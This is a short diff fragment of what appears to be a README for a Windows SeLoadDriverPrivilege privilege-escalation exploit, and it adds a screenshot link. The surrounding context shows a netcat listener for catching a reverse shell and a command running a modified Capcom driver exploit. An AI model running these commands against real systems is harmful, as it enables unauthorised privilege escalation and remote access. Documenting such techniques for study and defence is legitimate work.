@@ -14,3 +14,4 @@ rlwrap -cAr nc -lvnp 2222
 ```csharp
 .\ExploitCapcom_modded.exe
 ```
+![image](https://github.com/Grizzy529/SeLoadDriverPrivilege/assets/102862377/4021b484-3ab6-4b3a-bf83-56b70ba9e671)
